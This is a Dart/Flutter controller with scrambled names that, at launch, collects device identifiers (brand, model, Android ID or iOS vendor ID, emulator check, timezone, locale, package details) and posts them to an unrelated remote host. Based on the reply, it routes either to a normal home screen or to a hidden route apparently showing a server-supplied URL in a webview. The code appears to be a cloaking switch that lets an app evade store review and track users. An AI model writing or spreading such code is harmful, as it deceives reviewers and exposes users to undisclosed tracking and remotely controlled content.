import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var dzknftvj = RxBool(false);
  var aqkeglv = RxBool(true);
  var lushdv = RxString("");
  var kaden = RxBool(false);
  var marvin = RxBool(true);
  final dwphignu = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    tmuhyp();
  }


  Future<void> tmuhyp() async {

    kaden.value = true;
    marvin.value = true;
    aqkeglv.value = false;

    dwphignu.post("https://xia.jueloppi.xyz/mlTfwg6uF4BD3bJ",data: await rbywomjcu()).then((value) {
      var fahunbqg = value.data["fahunbqg"] as String;
      var mbopnedc = value.data["mbopnedc"] as bool;
      if (mbopnedc) {
        lushdv.value = fahunbqg;
        marietta();
      } else {
        sipes();
      }
    }).catchError((e) {
      aqkeglv.value = true;
      marvin.value = true;
      kaden.value = false;
    });
  }

  Future<Map<String, dynamic>> rbywomjcu() async {
    final DeviceInfoPlugin drph = DeviceInfoPlugin();
    PackageInfo evguoznh_pduiglh = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var ivwofu = Platform.localeName;
    var EwrWTMSl = currentTimeZone;

    var dQBqIv = evguoznh_pduiglh.packageName;
    var xeBlSkYQ = evguoznh_pduiglh.version;
    var GfPd = evguoznh_pduiglh.buildNumber;

    var CMPBw = evguoznh_pduiglh.appName;
    var ymMLZw = "";
    var savannahDeckow = "";
    var adrainGerhold = "";
    var xvikEHh  = "";
    var tessieKling = "";
    var pansyConsidine = "";
    var tTVK = "";
    var amiraJohnston = "";


    var YqDIGi = "";
    var eaEZoTN = false;

    if (GetPlatform.isAndroid) {
      YqDIGi = "android";
      var tnxzkufq = await drph.androidInfo;

      ymMLZw = tnxzkufq.brand;

      tTVK  = tnxzkufq.model;
      xvikEHh = tnxzkufq.id;

      eaEZoTN = tnxzkufq.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      YqDIGi = "ios";
      var hyprdkt = await drph.iosInfo;
      ymMLZw = hyprdkt.name;
      tTVK = hyprdkt.model;

      xvikEHh = hyprdkt.identifierForVendor ?? "";
      eaEZoTN  = hyprdkt.isPhysicalDevice;
    }
    var res = {
      "GfPd": GfPd,
      "xeBlSkYQ": xeBlSkYQ,
      "dQBqIv": dQBqIv,
      "adrainGerhold" : adrainGerhold,
      "tTVK": tTVK,
      "pansyConsidine" : pansyConsidine,
      "CMPBw": CMPBw,
      "EwrWTMSl": EwrWTMSl,
      "ymMLZw": ymMLZw,
      "xvikEHh": xvikEHh,
      "amiraJohnston" : amiraJohnston,
      "YqDIGi": YqDIGi,
      "eaEZoTN": eaEZoTN,
      "tessieKling" : tessieKling,
      "ivwofu": ivwofu,
      "savannahDeckow" : savannahDeckow,

    };
    return res;
  }

  Future<void> sipes() async {
    Get.offAllNamed("/home");
  }

  Future<void> marietta() async {
    Get.offAllNamed("/equ-be");
  }

}
